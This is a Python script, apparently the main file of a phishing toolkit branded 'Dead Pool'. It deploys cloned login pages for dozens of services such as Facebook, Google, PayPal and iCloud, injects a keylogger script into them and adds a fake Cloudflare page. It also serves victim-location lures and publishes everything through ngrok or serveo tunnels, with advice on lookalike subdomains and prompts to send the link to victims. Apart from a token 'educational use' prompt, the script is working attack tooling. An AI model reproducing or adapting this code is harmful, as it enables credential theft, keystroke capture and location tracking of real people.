#!/usr/bin/python3
# This Python file uses the following encoding: utf-8
import getpass
import base64
import multiprocessing
import gettext
import sys
import ssl
import re
import json
import subprocess
import ctypes
from time import sleep
from os import system, environ, path, getuid
from distutils.dir_util import copy_tree
from subprocess import check_output, CalledProcessError
from sys import stdout, argv, exit
from Server import *
from Checks import *
RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2= '\033[91m', '\033[46m', '\033[36m', '\033[1;32m', '\033[0m' , '\033[1;33m' , '\033[1;93m', '\033[1;92m'
def menu_q():
    system('clear')
    print("            {5}+++++++++++++++++++++++++++++++++++++++++++++++++\n           |  {2}WITH GREAT POWER , COMES GREAT RESPONSIBILITY{5}  |     \n            +++++++++++++++++++++++++++++++++++++++++++++++++{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    if input("\n\n\n\nDo you agree to use this tool for educational/testing purposes only? {5}({3}Y{5}/{0}N{5})\n{0}DEADPOOL ---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
        sleep(1)
    else:
        print("\n\n{0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.! ]{4}\n\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        exit()
########################################################################################################################################################################################################
def banner():
    system('clear')
    print('''
    {2}██████╗ ███████╗ █████╗ ██████╗ {6} ██████╗  ██████╗  ██████╗ ██╗
    {2}██╔══██╗██╔════╝██╔══██╗██╔══██╗{6} ██╔══██╗██╔═══██╗██╔═══██╗██║
    {2}██║  ██║█████╗  ███████║██║  ██║{6} ██████╔╝██║   ██║██║   ██║██║
    {2}██║  ██║██╔══╝  ██╔══██║██║  ██║{6} ██╔═══╝ ██║   ██║██║   ██║██║
    {2}██████╔╝███████╗██║  ██║██████╔╝{6} ██║     ╚██████╔╝╚██████╔╝███████╗
    {2}╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ {6} ╚═╝      ╚═════╝  ╚═════╝ ╚══════╝{4}
     {5}********************{0}Modern Phishing Tool{5}************************* 
     ***********{0}PHISHING-KEYLOGGER-INFORMATION COLLECTOR{5}**************
     **************{0}ALL_IN_ONE_TOOL-SOCIALENGINEERING{5}******************{4}
'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,GREEN2))

    
########################################################################################################################################################################################################
def s_banner():
    system('clear')
    print("""{0}+++++++++++++++++++++++++++++++++++++++++++++++++++++++++{4}""".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print("""{0}|{4}      {5}   )    (( (    )   (  .  (  .  (   (  {4}          {0}|{4}""".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print("""{0}|{4}      {5}  (()  (\())\  (()  )\  . )\  . )\  )\ {4}          {0}|{4}""".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print("""{0}|{4}      {5} ()(_)))(_)_()()(_)((_)  ((_)  ((_)((_){4}          {0}|{4}""".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print("""{0}|{4}      {2}█▀▀▄ █▀▀▀ ▄▀▀▄ █▀▀▄ █▀▀█ █▀▀▀█ █▀▀▀█ █    {4}       {0}|{4}""".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print("""{0}|{4}      {2}█  █ █▀▀▀ █▄▄█ █  █ █▄▄█ █   █ █   █ █    {4}       {0}|{4}""".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print("""{0}|{4}      {2}█▄▄▀ █▄▄▄ █  █ █▄▄▀ █    █▄▄▄█ █▄▄▄█ █▄▄█ {4}       {0}|{4}""".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print("""{0}|{4}                                                       {0}|{4}""".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print("""{0}+++++++++++++++++++++++++++++++++++++++++++++++++++++++++{4}""".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))

########################################################################################################################################################################################################
    
def listpage():
    print("{5}--------------------------------------------\n{2}SELECT ANY SOCIAL MEDIAPAGE FOR YOUR VICTIM:{5}\n--------------------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n{2}PHISHING-MODULES-ARE:{4}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print(" {0}[{2}01{0}]{2} Facebook       {0}[{2}13{0}]{2} Steam          {0}[{2}25{0}]{2} Badoo            {0}[{2}37{0}]{2} PlayStationS".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print(" {0}[{2}02{0}]{2} Google         {0}[{2}14{0}]{2} VK             {0}[{2}26{0}]{2} CryptoCurrency   {0}[{2}38{0}]{2} Xbox".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print(" {0}[{2}03{0}]{2} LinkedIn       {0}[{2}15{0}]{2} iCloud         {0}[{2}27{0}]{2} DevianArt".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print(" {0}[{2}04{0}]{2} GitHub         {0}[{2}16{0}]{2} GitLab         {0}[{2}28{0}]{2} DropBox".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print(" {0}[{2}05{0}]{2} StackOverflow  {0}[{2}17{0}]{2} Netflix        {0}[{2}29{0}]{2} eBay  ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print(" {0}[{2}06{0}]{2} WordPress      {0}[{2}18{0}]{2} Origin         {0}[{2}30{0}]{2} MySpace ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print(" {0}[{2}07{0}]{2} Twitter        {0}[{2}19{0}]{2} Pinterest      {0}[{2}31{0}]{2} PayPal ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print(" {0}[{2}08{0}]{2} Instagram      {0}[{2}20{0}]{2} ProtonMail     {0}[{2}32{0}]{2} Shopify".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print(" {0}[{2}09{0}]{2} Snapchat       {0}[{2}21{0}]{2} Spotify        {0}[{2}33{0}]{2} Verizon ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print(" {0}[{2}10{0}]{2} Yahoo          {0}[{2}22{0}]{2} Quora          {0}[{2}34{0}]{2} Yandex ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print(" {0}[{2}11{0}]{2} Twitch         {0}[{2}23{0}]{2} PornHub        {0}[{2}35{0}]{2} Reddit ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print(" {0}[{2}12{0}]{2} Microsoft      {0}[{2}24{0}]{2} Adobe          {0}[{2}36{0}]{2} Subito.it ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2))
    print("\n{2}SOCIAL{0}-{2}ENGINEERING{0}-{2}TOOLS{4}:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print(" \n{2}Enter {0}A{2} to Get Victim Location{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    option = input("\n{0}DEADPOOL --->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    if option == '1' or option == '01':
        print('''{5}\n--------------------------------{2}\n SELECT ANY ONE MODE...\n{5}--------------------------------{4}'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = input("\n\t{2}OPERATION MODE:{4}\n {0}[{2}1{0}]{2} Standard Page Phishing\n {0}[{2}2{0}]{2} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{2}3{0}]{2} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{2}4{0}]{2} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}DEADPOOL--->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        runPhishing('Facebook', customOption)
    elif option == '2' or option == '02':
        print('''{5}\n--------------------------------{2}\n SELECT ANY ONE MODE...\n{5}--------------------------------{4}'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = input("\n{2}OPERATION MODE:{4}\n \t{0}[{2}1{0}]{2} Standard Page Phishing\n {0}[{2}2{0}]{2} Advanced Phishing(poll_mode/login_with)\n {0}[{2}3{0}]{2} New Google Web \n{0}DEADPOOL--->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        runPhishing('Google', customOption)
    elif option == '3' or option == '03':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('LinkedIn', customOption)
    elif option == '4' or option == '04':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('GitHub', customOption)
    elif option == '5' or option == '05':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('StackOverflow', customOption)
    elif option == '6' or option == '06':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('WordPress', customOption)
    elif option == '7' or option == '07':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Twitter', customOption)
    elif option == '8' or option == '08':
        print('''{5}\n--------------------------------{2}\n SELECT ANY ONE MODE...\n{5}--------------------------------{4}'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = input("\n{2}OPERATION MODE:{4}\n {0}[{2}1{0}]{2} Standard Instagram Web Page Phishing\n {0}[{2}2{0}]{2} Instagram Autoliker Phising (To Lure The Users)\n {0}[{2}3{0}]{2} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{2}4{0}]{2} Instagram Verified Badge Attack (Lure To Get Blue Badge) \n {0}[{2}5{0}]{2} Instafollower (Lure To Get More Followers)\n{0}DEADPOOL--->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        runPhishing('Instagram', customOption)
    elif option == '9' or option == '09':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Snapchat', customOption)
    elif option == '10':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Yahoo', customOption)
    elif option == '11':
        lprint('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Twitch', customOption)
    elif option == '12':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Microsoft', customOption)
    elif option == '13':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Steam', customOption)
    elif option == '14':
        print('''{5}\n--------------------------------{2}\n SELECT ANY ONE MODE...\n{5}--------------------------------{4}'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = input("\n{2}OPERATION MODE:{4}\n {0}[{2}1{0}]{2} Standard VK Web Page Phishing\n {0}[{2}2{0}]{2} Advanced Phishing(poll_mode/login_with)\n{0}DEADPOOL--->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        runPhishing('VK', customOption)
    elif option == '15':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('iCloud', customOption)
    elif option == '16':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('GitLab', customOption)
    elif option == '17':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('NetFlix', customOption)
    elif option == '18':
        lprint('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Origin', customOption)
    elif option == '19':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Pinterest', customOption)
    elif option == '20':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('ProtonMail', customOption)
    elif option == '21':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Spotify', customOption)
    elif option == '22':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Quora', customOption)
    elif option == '23':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('PornHub', customOption)
    elif option == '24':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Adobe', customOption)
    elif option == '25':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Badoo', customOption)
    elif option == '26':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('CryptoCurrency', customOption)
    elif option == '27':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('DevianArt', customOption)
    elif option == '28':
        print('''{5}\n--------------------------------{2}\n{4}'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('DropBox', customOption)
    elif option == '29':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('eBay', customOption)
    elif option == '30':
        print('''{5}\n--------------------------------{2}\n '''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Myspace', customOption)
    elif option == '31':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('PayPal', customOption)
    elif option == '32':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Shopify', customOption)
    elif option == '33':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Verizon', customOption)
    elif option == '34':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Yandex', customOption)
    elif option == '35':
        print('''{5}\n--------------------------------{2}\n SELECT ANY ONE MODE...\n{5}--------------------------------{4}'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = input("\n{2}OPERATION MODE:{4}\n {0}[{2}01{0}]{2} New reddit page\n {0}[{2}2{0}]{2} Old reddit page\n{0}DEADPOOL--->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        runPhishing('Reddit', customOption)
    elif option == '36':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Subitoit', customOption)
    elif option == '37':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('PlayStation', customOption)
    elif option == '38':
        print('''{5}\n--------------------------------{2}\n'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = ''
        runPhishing('Xbox', customOption)
    elif option == 'A' or option == 'a':
        print('''{5}\n--------------------------------{2}\n SELECT ANY ONE MODE...\n{5}--------------------------------{4}'''.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        customOption = input("\n{2}OPERATION MODE:{4}\n {0}[{2}1{0}]{2} NEAR YOU (Webpage Looks Like Legitimate)\n {0}[{2}2{0}]{2} GDRIVE (Asks For Location Permission To redirect GDRIVE) \n{0}DEADPOOL--->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        runPhishing('LOCATION', customOption)

########################################################################################################################################################################################################

def runPhishing(page, customOption):  # Phishing pages selection menu
    system('rm -r Server/www/ && mkdir Server/www && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
    if customOption == '1' and page == 'Facebook':
        copy_tree("WebPages/fb_standard/", "Server/www/")
    elif customOption == '2' and page == 'Facebook':
        copy_tree("WebPages/fb_advanced_poll/", "Server/www/")
    elif customOption == '3' and page == 'Facebook':
        copy_tree("WebPages/fb_security_fake/", "Server/www/")
    elif customOption == '4' and page == 'Facebook':
        copy_tree("WebPages/fb_messenger/", "Server/www/")
    elif customOption == '1' and page == 'Google':
        copy_tree("WebPages/google_standard/", "Server/www/")
    elif customOption == '2' and page == 'Google':
        copy_tree("WebPages/google_advanced_poll/", "Server/www/")
    elif customOption == '3' and page == 'Google':
        copy_tree("WebPages/google_advanced_web/", "Server/www/")
    elif page == 'LinkedIn':
        copy_tree("WebPages/linkedin/", "Server/www/")
    elif page == 'GitHub':
        copy_tree("WebPages/GitHub/", "Server/www/")
    elif page == 'StackOverflow':
        copy_tree("WebPages/stackoverflow/", "Server/www/")
    elif page == 'WordPress':
        copy_tree("WebPages/wordpress/", "Server/www/")
    elif page == 'Twitter':
        copy_tree("WebPages/twitter/", "Server/www/")
    elif page == 'Snapchat':
        copy_tree("WebPages/Snapchat_web/", "Server/www/")
    elif page == 'Yahoo':
        copy_tree("WebPages/yahoo_web/", "Server/www/")
    elif page == 'Twitch':
        copy_tree("WebPages/twitch/", "Server/www/")
    elif page == 'Microsoft':
        copy_tree("WebPages/live_web/", "Server/www/")
    elif page == 'Steam':
        copy_tree("WebPages/steam/", "Server/www/")
    elif page == 'iCloud':
        copy_tree("WebPages/iCloud/", "Server/www/")
    elif customOption == '1' and page == 'Instagram':
        copy_tree("WebPages/Instagram_web/", "Server/www/")
    elif customOption == '2' and page == 'Instagram':
        copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
    elif customOption == '3' and page == 'Instagram':
        copy_tree("WebPages/Instagram_advanced_attack/", "Server/www/")
    elif customOption == '4' and page == 'Instagram':
        copy_tree("WebPages/Instagram_VerifiedBadge/", "Server/www/")
    elif customOption == '5' and page == 'Instagram':
        copy_tree("WebPages/instafollowers/", "Server/www/")
    elif customOption == '1' and page == 'VK':
        copy_tree("WebPages/VK/", "Server/www/")
    elif customOption == '2' and page == 'VK':
        copy_tree("WebPages/VK_poll_method/", "Server/www/")
    elif page == 'GitLab':
        copy_tree("WebPages/gitlab/", "Server/www/")
    elif page == 'NetFlix':
        copy_tree("WebPages/netflix/", "Server/www/")
    elif page == 'Origin':
        copy_tree("WebPages/origin/", "Server/www/")
    elif page == 'Pinterest':
        copy_tree("WebPages/pinterest/", "Server/www/")
    elif page == 'ProtonMail':
        copy_tree("WebPages/protonmail/", "Server/www/")
    elif page == 'Spotify':
        copy_tree("WebPages/spotify/", "Server/www/")
    elif page == 'Quora':
        copy_tree("WebPages/quora/", "Server/www/")
    elif page == 'PornHub':
        copy_tree("WebPages/pornhub/", "Server/www/")
    elif page == 'Adobe':
        copy_tree("WebPages/adobe/", "Server/www/")
    elif page == 'Badoo':
        copy_tree("WebPages/badoo/", "Server/www/")
    elif page == 'CryptoCurrency':
        copy_tree("WebPages/cryptocurrency/", "Server/www/")
    elif page == 'DevianArt':
        copy_tree("WebPages/devianart/", "Server/www/")
    elif page == 'DropBox':
        copy_tree("WebPages/dropbox/", "Server/www/")
    elif page == 'eBay':
        copy_tree("WebPages/ebay/", "Server/www/")
    elif page == 'Myspace':
        copy_tree("WebPages/myspace/", "Server/www/")
    elif page == 'PayPal':
        copy_tree("WebPages/paypal/", "Server/www/")
    elif page == 'Shopify':
        copy_tree("WebPages/shopify/", "Server/www/")
    elif page == 'Verizon':
        copy_tree("WebPages/verizon/", "Server/www/")
    elif page == 'Yandex':
        copy_tree("WebPages/yandex/", "Server/www/")
    elif customOption == '1' and page == 'Reddit':
        copy_tree("WebPages/Reddit/", "Server/www/")
    elif customOption == '2' and page == 'Reddit':
        copy_tree("WebPages/Reddit-old/", "Server/www/")
    elif page == 'Subitoit':
        copy_tree("WebPages/subitoit/", "Server/www/")
    elif page == 'PlayStation':
        copy_tree('WebPages/playstation/', "Server/www/")
    elif page == 'Xbox':
        copy_tree('WebPages/xbox/', "Server/www/")
    elif customOption == '1' and page == 'LOCATION':
        sleep(1)
        copy_tree('WebPages/TOOLS/nearyou', "Server/www/")
        print("\n\n{0}[{2}*{0}]{2} PLEASE USE TUNNELS/URL WITH '{0}https{2}' \n{0}[{2}*{0}]{2} Browsers Trusts only Https Links To Share Location\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        input('\nPress Enter To continue...')
    elif customOption == '2' and page == 'LOCATION':
        sleep(1)
        copy_tree('WebPages/TOOLS/gdrive', "Server/www/")
        print("\n\n{0}[{2}*{0}]{2} PLEASE USE TUNNELS/URL WITH '{0}https{2}' \n{0}[{2}*{0}]{2} Browsers Trusts only Https Links To Share Location\n{0}[{2}*{0}]{2} {0}Tip: {2}Use Google Drive File Url as Custom Url while asked.".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        input('\nPress Enter To continue...')
        
########################################################################################################################################################################################################

def keyloggerprompt():
    system('clear')
    s_banner()
    print("{5}-------------------------------\n{0}[{2} KEYLOGGER PROMPT {0}]{2}!! \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n{0}ATTENTION: {2}Adding Keylogger Mostly Kills the Tunnel Connection.\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\nDO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE?-{5}({2}Y{5}/{0}N{5}){2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    choice = input("\n\n{0}YOUR CHOICE --->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper()
    if choice == 'Y':
            if path.exists('Server/www/index.html'):
                with open('Server/www/index.html') as f:
                    read_data = f.read()
                c = read_data.replace('</title>','</title><script src="keylogger.js"></script>')
                f = open('Server/www/index.html', 'w')
                f.write(c)
                f.close()
                sleep(2)
                print("\n{0}[{2}#{0}]{2} KEYLOGGER ADDED !!!{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
                sleep(2)
            else:
                with open('Server/www/index.php') as f:
                    read_data = f.read()
                c = read_data.replace('</title>','</title><script src="keylogger.js"></script>')
                f = open('Server/www/index.php', 'w')
                f.write(c)
                f.close()
                sleep(2)
                print("\n{0}[{2}#{0}]{2} KEYLOGGER ADDED {0}!!!{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
                sleep(2)
    else:
        sleep(1)

########################################################################################################################################################################################################

def cloudfarePrompt():

    system('clear')
    s_banner()
    print("{5}-------------------------------\n{0}[{2} CLOUDFARE PROMPT {0}]{2}!! \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n{0}[{2}*{0}]{2}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{4}({2}Y{4}/{0}N{4})".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    choice = input("\n\n{0}YOUR CHOICE --->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper()
    if choice == 'Y':
        system('mv Server/www/index.* Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
        print("\n{0}[{2}#{0}]{2} CLOUDFARE PROTECTION ADDED {0}!!!{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        sleep(2)
    else:
        sleep(2)
########################################################################################################################################################################################################

def inputCustom():
    system('clear')
    s_banner()
    print("\n{0}[{2}*{0}]{2}Insert a custom redirect url:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    custom = input("\n{0}REDIRECT HERE---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    if 'http://' in custom or 'https://' in custom:
        pass
    else:
        custom = 'http://' + custom

    if path.exists('Server/www/js/location.js'): 
        with open('Server/www/js/location.js') as f: 
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/js/location.js', 'w')
        f.write(c)
        f.close()

    if path.exists('Server/www/post.php') and path.exists('Server/www/login.php'):
        with open('Server/www/login.php') as f:
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/login.php', 'w')
        f.write(c)
        f.close()

        with open('Server/www/post.php') as f:
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/post.php', 'w')
        f.write(c)
        f.close()

    else:
        with open('Server/www/login.php') as f:
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/login.php', 'w')
        f.write(c)
        f.close()
########################################################################################################################################################################################################

def selectPort():  # Question where user must select port
    system('clear')
    s_banner()
    print("\n{0}[{2}*{0}]{2}Select Any Available Port [1-65535]:{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    choice = input(" \n{0}DEADPOOL ---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    try:
        if (int(choice) > 65535 or int(choice) < 1):
            return selectPort()
        else:
            return choice
    except:
        return selectPort()
    
########################################################################################################################################################################################################

def runServer(port):
    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
    
########################################################################################################################################################################################################

def runLocalhost(port):
    system('clear')
    s_banner()
    print("\n{0}[{2}*{0}]{2}Enter Your LocalHost/Router Address [ifconfig]:{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    host = input(" \n{0}DEADPOOL ---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    system("fuser -k %s/tcp > /dev/null 2>&1".format(port))
    system("cd Server/www/ && php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
    print('\n[*] Starting Server On Address:: {0}:{1}'.format(host, port))
    sleep(2)
    system('clear')
    s_banner()
    print("\n{0}[{2}!{0}]{2} SEND THIS URL TO THE VICTIMS ON SAME NETWORK-\n{0}[{2}*{0}]{2} Localhost URL: http://{6}:{7}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,host,port))
    print("\n")
########################################################################################################################################################################################################
def runNgrok(port):
    s_banner()
    #system('chmod 777 ./Server/ngrok')
    #runServer(port)
    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
    system('./Server/ngrok http {0} > /dev/null &'.format(port))
    while True:
        system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link.url')
        urlFile = open('link.url', 'r')
        url = urlFile.read()
        urlFile.close()
        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
            print("\n\t{2}press enter.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
            #print("\n{0}[{2}!{0}] {2}SEND THIS NGROK URL TO VICTIMS-\n{0}[{2}*{0}] {2}Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}NGROK URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, port) + url)
            break
########################################################################################################################################################################################################

def customServeo(port):

    s_banner()
    #runServer(port)
    print("\n\n{5}-------------------------------\n{0}[{2} CREATE A CUSTOM URL HERE !!{0}]{0} \n{5}-------------------------------\n\n{0}[{2}!{0}]{2} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\nInsert a custom subdomain for serveo".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
    lnk = input("\n{0}CUSTOM Subdomain ---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
    if not ".serveo.net" in lnk:
        lnk += ".serveo.net"
    else:
        pass
